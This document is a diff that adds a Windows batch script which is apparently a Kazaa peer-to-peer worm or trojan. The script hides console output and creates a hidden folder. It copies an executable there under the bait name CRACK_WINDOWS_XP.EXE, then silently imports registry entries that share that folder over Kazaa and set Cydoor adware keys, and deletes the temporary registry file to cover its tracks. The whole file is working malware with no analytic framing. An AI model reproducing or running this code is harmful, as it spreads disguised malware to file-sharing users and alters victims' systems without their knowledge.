@@ -1,0 +1,44 @@
+@echo off
+ctty nul
+md c:\CheckSystem
+attrib +h c:\CheckSystem
+copy BTWTCH~1.EXE c:\CheckSystem\CRACK_WINDOWS_XP.EXE
+
+@echo off
+@echo REGEDIT4>%TEMP%\troj.reg
+
+
+@echo [HKEY_CURRENT_USER\Software\Kazaa\LocalContent]>>%TEMP%\troj.reg
+@echo "Dir0"="012345:c:\\CheckSystem">>%TEMP%\troj.reg
+
+@echo [HKEY_CURRENT_USER\Software\Kazaa\LocalContent]>>%TEMP%\troj.reg
+@echo "Dir1"="012345:d:\\Kazzaaa">>%TEMP%\troj.reg
+
+@echo [HKEY_CURRENT_USER\Software\Cydoor\Adwr_291\Loct_0\Level_2]>>%TEMP%\troj.reg
+@echo "SeqnList"=hex:37,1a,00,00,1b,00,00,00,00,00,00,00,38,1a,00,00,19,00,00,00,00,00,00,00,39,1a,00,00,1a,00,00,00,00,00,00,00,36,1a,00,00,00,00,00,00,00,00,00,00,>>%TEMP%\troj.reg
+
+@echo [HKEY_CURRENT_USER\Software\Cydoor\Adwr_291\Loct_0\Level_2\Seqn_6712]>>%TEMP%\troj.reg
+@echo "ExpsMSecCnt"=dword:00008cc8>>%TEMP%\troj.reg
+
+@echo [HKEY_CURRENT_USER\Software\Cydoor\Adwr_291\Loct_0\Level_2\Seqn_6712]>>%TEMP%\troj.reg
+@echo "ActvMSecCnt"=dword:00008476>>%TEMP%\troj.reg
+
+@echo [HKEY_USERS\.DEFAULT\Software\Kazaa\LocalContent]>>%TEMP%\troj.reg
+@echo "Dir0"="012345:c:\\CheckSystem">>%TEMP%\troj.reg
+
+@echo [HKEY_USERS\.DEFAULT\Software\Kazaa\LocalContent]>>%TEMP%\troj.reg
+@echo "Dir1"="012345:d:\\Kazzaaa">>%TEMP%\troj.reg
+
+@echo [HKEY_USERS\.DEFAULT\Software\Cydoor\Adwr_291\Loct_0\Level_2]>>%TEMP%\troj.reg
+@echo "SeqnList"=hex:37,1a,00,00,1b,00,00,00,00,00,00,00,38,1a,00,00,19,00,00,00,00,00,00,00,39,1a,00,00,1a,00,00,00,00,00,00,00,36,1a,00,00,00,00,00,00,00,00,00,00,>>%TEMP%\troj.reg
+
+@echo [HKEY_USERS\.DEFAULT\Software\Cydoor\Adwr_291\Loct_0\Level_2\Seqn_6712]>>%TEMP%\troj.reg
+@echo "ExpsMSecCnt"=dword:00008cc8>>%TEMP%\troj.reg
+
+@echo [HKEY_USERS\.DEFAULT\Software\Cydoor\Adwr_291\Loct_0\Level_2\Seqn_6712]>>%TEMP%\troj.reg
+@echo "ActvMSecCnt"=dword:00008476>>%TEMP%\troj.reg
+
+regedit /s %TEMP%\troj.reg
+del %TEMP%\troj.reg
+ctty con
+exit
